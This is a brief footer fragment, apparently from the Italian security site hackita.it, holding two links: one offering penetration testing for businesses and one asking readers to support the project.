* üõ°Ô∏è Pentest per aziende ‚Üí [https://hackita.it/servizi](https://hackita.it/servizi)
* ‚ù§Ô∏è Supporta il progetto ‚Üí [https://hackita.it/supporto](https://hackita.it/supporto)

***
